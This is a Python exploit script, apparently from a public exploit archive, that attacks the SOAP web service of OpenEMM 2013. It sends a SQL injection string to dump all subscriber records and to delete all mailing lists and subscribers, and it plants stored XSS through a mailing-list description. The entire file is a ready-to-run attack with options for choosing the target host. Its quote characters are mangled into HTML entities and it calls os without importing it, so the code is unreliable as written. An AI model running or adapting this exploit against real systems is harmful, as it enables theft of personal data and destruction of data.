import sys
from SOAPpy import WSDL
from argparse import ArgumentParser
from re import sub
  
# Exploit Title: OpenEMM 2013 SQL Injection / Stored XSS
# Date: 07/20/2013
# Exploit Author: drone (@dronesec)
# More information (and required WSDL file):
#     http://forelsec.blogspot.com/2013/07/openemm-2013-810380hf130066-soap-sql.html
# Vendor Homepage: http://www.openemm.org/
# Software Link: https://downloads.sourceforge.net/project/openemm/OpenEMM%20software/OpenEMM%202013/OpenEMM-2013-bin.tar.gz
# Version: 2013 (8.10.380.hf13.0.066)
# Tested on: Ubuntu 12.04
  
""" Exploits a host of vulnerabilities discovered in OpenEMM.
   Required ws.wsdl file should be in local directory.
"""
def run(options):
    """ run exploit
   """
    wsdl_file = "./ws.wsdl"
    sploit = "\\&#039; OR 1=1;-- "
  
    _server = WSDL.Proxy(wsdl_file)
  
    if options.subscribers:
        # iterate until we get a null response
        idx = 1
        while True:
            ret = _server.getSubscriber("wsadmin", sploit, idx)
            if ret.paramValues == &#039;&#039;:
                print &#039;[!] Discovered %d subscribers&#039;%(idx-1)
                break
  
            print ret.paramValues
            idx += 1
  
    elif options.mlist:
        try:
            print &#039;[!] Description field vulnerable to stored xss!&#039;
            description = raw_input(&#039;[!] Enter mlist description: &#039;)
        except:
            description = &#039;&#039;
  
        ret = _server.addMailinglist(&#039;wsadmin&#039;, sploit, options.mlist, description)
        if ret > 0: print &#039;[!] Saved successfully&#039;
        else:       print &#039;[!] Save unsuccessful&#039;
  
    elif options.dmlist:
        print &#039;[!] Deleting all mailing lists...&#039;
        idx = 1
        while True:
            ret = _server.deleteMailinglist(&#039;wsadmin&#039;, sploit, idx)
            if ret == 0:
                print &#039;[!] Deleted %d mailing lists.&#039;%idx
                break
            idx += 1
  
    elif options.dsubs:
        print &#039;[!] Deleting all subscribers...&#039;
        idx = 1
        while True:
            ret = _server.deleteSubscriber(&#039;wsadmin&#039;, sploit, idx)
            if ret == 0:
                print &#039;[!] Deleted %d subscribers.&#039;%idx
                break
            idx += 1
  
def parse_args():
    """ parse args and sub in the desired IP
   """
    parser = ArgumentParser()
    parser.add_argument(&#039;-i&#039;, help=&#039;server address&#039;, action=&#039;store&#039;,
                dest=&#039;host&#039;, required=True)
    parser.add_argument(&#039;-s&#039;, help=&#039;fetch all subscribers&#039;, action=&#039;store_true&#039;,
                dest=&#039;subscribers&#039;)
    parser.add_argument(&#039;-m&#039;, help=&#039;create new mailing list (XSS)&#039;, action=&#039;store&#039;,
                dest=&#039;mlist&#039;)
    parser.add_argument(&#039;--dm&#039;, help=&#039;delete all mailing lists&#039;, action=&#039;store_true&#039;,
                dest=&#039;dmlist&#039;)
    parser.add_argument(&#039;--ds&#039;, help=&#039;delete all subscribers&#039;, action=&#039;store_true&#039;,
                dest=&#039;dsubs&#039;)
  
    options = parser.parse_args()
    try:
        # sub in server address
        with open(&#039;ws.wsdl&#039;, &#039;r&#039;) as f:
            out = open(&#039;tmp.wsdl&#039;, &#039;w+&#039;)
            for line in f:
                line = sub(&#039;location="(.*?)"&#039;,
                    &#039;location="http://{0}:8080/emm_webservice"&#039;.format(options.host),
                    line)
                out.write(line)
            out.close()
    except IOError:
        print &#039;[-] ws.wsdl not found&#039;
        sys.exit(1)
  
    # replace ws.wsdl with temp one
    os.system(&#039;mv tmp.wsdl ws.wsdl&#039;)
    return options
  
if __name__ == "__main__":
    options = parse_args()
    run(options)

